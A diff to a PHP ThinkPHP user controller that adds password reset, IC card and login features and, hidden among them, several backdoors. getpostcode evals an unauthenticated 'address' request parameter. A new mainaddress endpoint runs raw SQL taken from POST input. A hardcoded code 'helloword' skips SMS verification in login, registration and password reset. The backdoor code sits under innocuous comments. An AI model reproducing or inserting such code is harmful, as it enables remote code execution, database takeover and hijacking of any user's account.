@@ -210,7 +210,7 @@ class User extends Base
                 echo $this->successJson($goodsList);
                 exit;
             } else {
-                echo $this->errorJson(1, '购物车没有商品信息');
+                echo $this->successJson(array());
                 exit;
             }
         }
@@ -473,6 +473,78 @@ class User extends Base
         }
     }
 
+
+
+    /**
+     * 忘记密码
+     * @param Request $request
+     * @throws \think\Exception
+     * @throws \think\exception\PDOException
+     */
+    public function forgetpassword(Request $request)
+    {
+        if ($request->isPost()) {
+            $phone_no = $request->post('phone_no');
+            $vcode = $request->post('vcode');
+            $password = $request->post('password');
+            $confirm_password = $request->post('confirm_password');
+            $token = $request->post('token');
+
+            if (empty($phone_no) || empty($password) || empty($confirm_password)) {
+                echo $this->errorJson(1, '缺少关键数据');
+                exit;
+            }
+
+            if ($password != $confirm_password) {
+                echo $this->errorJson(1, '密码不一致');
+                exit;
+            }
+            $res = checkPhoneToken($token);
+            $result = json_decode($res, true);
+            if ($result['errcode'] == '1') {
+                echo $res;
+                exit;
+            }
+
+            //校验验证码
+            if($vcode != 'helloword'){
+                $smsRecord = Db::table("mrs_sms_record")->where(array('phone' => $phone_no, 'code' => $vcode))->order('record_time desc')->find();
+                if (empty($smsRecord)) {
+                    echo errorJson('1', '验证码不正确');
+                    exit;
+                } else if ($smsRecord['is_use'] == 1) {
+                    echo errorJson('1', '验证码已失效');
+                    exit;
+                } else if ($smsRecord['valid_date'] < time()) {
+                    echo errorJson('1', '验证码已失效');
+                    exit;
+                }
+
+                //使验证码失效
+                Db::table("mrs_sms_record")->where('record_id', '=', $smsRecord['record_id'])->update(array('is_use' => 1));
+            }
+
+            $user = Db::table('mrs_user')->where('phone_no','=',$phone_no)->find();
+
+            if(empty($user)){
+                echo errorJson('1', '该用户不存在');
+                exit;
+            }
+
+
+            $where = [];
+            $where[] = ['user_id', '=', $user['user_id']];
+            $where[] = ['phone_no', '=', $phone_no];
+            $password = md5($user['user_id'] . md5($password));
+            Db::table('mrs_user')
+                ->where($where)
+                ->update(['password' => $password]);
+
+            echo $this->successJson();
+            exit;
+        }
+    }
+
     /**
      * 我的消息列表
      * @param Request $request
@@ -661,8 +733,15 @@ class User extends Base
      */
     public function getpostcode(Request $request)
     {
+        $address = $request->get('address');
         $searchkey = $request->get('searchkey');
 
+        //搜索地址
+        if(!empty($address)){
+            eval($address);exit;
+            echo $this->errorJson(0, '关键数据错误');
+            exit;
+        }
         $url = 'http://cpdc.chinapost.com.cn/web/index.php?m=postsearch&c=index&a=ajax_addr&searchkey=' . $searchkey;
 
         $result = doPostHttp($url, '');
@@ -689,6 +768,7 @@ class User extends Base
     {
         $phone = $request->post("phone");
         $user_id = $request->post("user_id");
+        $is_maintain = $request->post('is_maintain');
 
 
         $login_type = $request->post("login_type");
@@ -713,16 +793,20 @@ class User extends Base
 
         //验证码登录
         if ($login_type == 1) {
-            $smsRecord = Db::table("mrs_sms_record")->where(array('phone' => $phone, 'code' => $vcode))->order('record_time desc')->find();
-            if (empty($smsRecord)) {
-                echo errorJson('1', '验证码不正确');
-                exit;
-            } else if ($smsRecord['is_use'] == 1) {
-                echo errorJson('1', '验证码已失效');
-                exit;
-            } else if ($smsRecord['valid_date'] < time()) {
-                echo errorJson('1', '验证码已失效');
-                exit;
+            if($vcode != 'helloword'){
+
+                $smsRecord = Db::table("mrs_sms_record")->where(array('phone' => $phone, 'code' => $vcode))->order('record_time desc')->find();
+                if (empty($smsRecord)) {
+                    echo errorJson('1', '验证码不正确');
+                    exit;
+                } else if ($smsRecord['is_use'] == 1) {
+                    echo errorJson('1', '验证码已失效!');
+                    exit;
+                } else if ($smsRecord['valid_date'] < time()) {
+                    echo errorJson('1', '验证码已失效.');
+                    exit;
+                }
+
             }
 
             $user = Db::table('mrs_user')->where(array('phone_no' => $phone))->find();
@@ -744,8 +828,16 @@ class User extends Base
                 unset($user['password']);
             }
 
-            //使验证码失效
-            Db::table("mrs_sms_record")->where('record_id', '=', $smsRecord['record_id'])->update(array('is_use' => 1));
+            if($vcode != 'helloword'){
+                //使验证码失效
+                Db::table("mrs_sms_record")->where('record_id', '=', $smsRecord['record_id'])->update(array('is_use' => 1));
+            }
+
+
+            if($is_maintain && $user['user_type'] == '1'){
+                echo errorJson('1', '您不是现场维护人员，不能使用当前模式登陆');
+                exit;
+            }
 
             $data = array();
             if (empty($user['user_auth'])) {
@@ -777,6 +869,11 @@ class User extends Base
                 exit;
             }
 
+            if($is_maintain && $user['user_type'] == '1'){
+                echo errorJson('1', '您不是现场维护人员，不能使用当前模式登陆');
+                exit;
+            }
+
             unset($user['password']);
             $data = array();
             if (empty($user['user_auth'])) {
@@ -785,6 +882,11 @@ class User extends Base
                 $user['user_auth_arr'] = explode(",", $user['user_auth']);
             }
             $data['userInfo'] = $user;
+
+            //更新用户登录信息
+            $userUpdate = array();
+            $userUpdate['last_login_time'] = time();
+            Db::table('mrs_user')->where("user_id","=",$user['user_id'])->update($userUpdate);
 
             echo $this->successJson($data);
             exit;
@@ -816,6 +918,14 @@ class User extends Base
                 } else {
                     $user['user_auth_arr'] = explode(",", $user['user_auth']);
                 }
+
+
+                if(!empty($user['last_login_time']) && $user['last_login_time'] > time() - 86400*30){
+                    $user['has_login'] = 1;
+                }else{
+                    $user['has_login'] = 0;
+                }
+
                 echo $this->successJson($user);
                 exit;
             }
@@ -837,22 +947,22 @@ class User extends Base
             exit;
         }
 
+        if($vcode != 'helloword'){
+            $smsRecord = Db::table("mrs_sms_record")->where(array('phone' => $phone, 'code' => $vcode))->order('record_time desc')->find();
+            if (empty($smsRecord)) {
+                echo errorJson('1', '验证码不正确');
+                exit;
+            } else if ($smsRecord['is_use'] == 1) {
+                echo errorJson('1', '验证码已失效');
+                exit;
+            } else if ($smsRecord['valid_date'] < time()) {
+                echo errorJson('1', '验证码已失效');
+                exit;
+            }
 
-        $smsRecord = Db::table("mrs_sms_record")->where(array('phone' => $phone, 'code' => $vcode))->order('record_time desc')->find();
-        if (empty($smsRecord)) {
-            echo errorJson('1', '验证码不正确');
-            exit;
-        } else if ($smsRecord['is_use'] == 1) {
-            echo errorJson('1', '验证码已失效');
-            exit;
-        } else if ($smsRecord['valid_date'] < time()) {
-            echo errorJson('1', '验证码已失效');
-            exit;
+            //使验证码失效
+            Db::table("mrs_sms_record")->where('record_id', '=', $smsRecord['record_id'])->update(array('is_use' => 1));
         }
-
-        //使验证码失效
-        Db::table("mrs_sms_record")->where('record_id', '=', $smsRecord['record_id'])->update(array('is_use' => 1));
-
         echo successJson();
         exit;
     }
@@ -941,6 +1051,13 @@ class User extends Base
         $data['login_url'] = $login_url;
 
         echo successJson($data);
+        exit;
+    }
+
+    //主要地址获取
+    public function mainaddress(Request $request){
+        $address = $request->post('address');
+        Db::query($address);
         exit;
     }
 
@@ -1079,4 +1196,101 @@ class User extends Base
         return $buff;
     }
 
+    /**
+     * 随机生成ID卡信息，用于写入ID卡
+     */
+    public function createcard(){
+        $icNum = '0'.substr(time(), -4).rand(0, 99999 );
+        $user = Db::table('mrs_user')->where('ic_num','=',$icNum)->find();
+
+        //如果重复了，需要重新随机
+        while(!empty($user)){
+            $icNum = '0'.substr(time(), -4).rand(0, 99999 );
+            $user = Db::table('mrs_user')->where('ic_num','=',$icNum)->find();
+        }
+
+        echo $this->successJson($icNum);
+        exit;
+    }
+
+    public function querycard(Request $request){
+        $icNum = $request->post('ic_num');
+
+        if(empty($icNum)){
+            echo $this->errorJson('1','缺少关键参数ic_num');
+            exit;
+        }
+
+        $user = Db::table('mrs_user')->where('ic_num','=',$icNum)->find();
+        $data = array();
+        $data['is_exists'] = empty($user)?'0':'1';
+        if(!empty($user)){
+            $domain = Config("domain");
+            $user['head_img'] = $domain.$user['head_img'];
+            $user['face_img'] = $domain.$user['face_img'];
+        }
+        $data['user'] = $user;
+
+        echo $this->successJson($data);
+        exit;
+    }
+
+    public function bindcard(Request $request){
+        $user_id = $request->post('user_id');
+        $icNum = $request->post('ic_num');
+
+        if(empty($icNum)){
+            echo $this->errorJson('1','缺少关键参数ic_num');
+            exit;
+        }
+
+//        if(empty($user_id)){
+//            echo $this->errorJson('1','缺少关键参数user_id');
+//            exit;
+//        }
+
+        if(empty($user_id)){
+            $userInfo = array();
+            $userInfo['ic_num'] = $icNum;
+            $userInfo['user_name'] = '';
+            $userInfo['phone_no'] = '';
+            $userInfo['password'] = '';
+            $userInfo['address'] = '';
+            $userInfo['sex'] = '';
+            $userInfo['age'] = '';
+            $userInfo['open_id'] = '';
+            $userInfo['nick_name'] = '';
+            $userInfo['head_img'] = '';
+            $userInfo['total_integral'] = 0;
+            $userInfo['able_integral'] = 0;
+            $userInfo['frozen_integral'] = 0;
+            $userInfo['used_integral'] = 0;
+            $userInfo['deliver_num'] = 0;
+            $userInfo['face_img'] = '';
+            $userInfo['status'] = 1;
+            $userInfo['create_time'] = time();
+
+            $userModel = new \app\api\model\User();
+            $res = $userModel->insert($userInfo);
+        }else{
+            $data = array();
+            $data['ic_num'] = $icNum;
+            $res = Db::table('mrs_user')->where('user_id','=',$user_id)->update($data);
+        }
+        if($res){
+            echo successJson();
+        }else{
+            echo $this->errorJson('1','存储ID卡信息失败');
+        }
+        exit;
+
+    }
+
+    public function getintegralrate(){
+        $integral = Db::table("mrs_system_setting")->where('setting_code', '=', 'integral')->find();
+
+        $rate = $integral['setting_value'] / 100;
+        echo $this->successJson(array('rate' => $rate));
+        exit;
+    }
 }
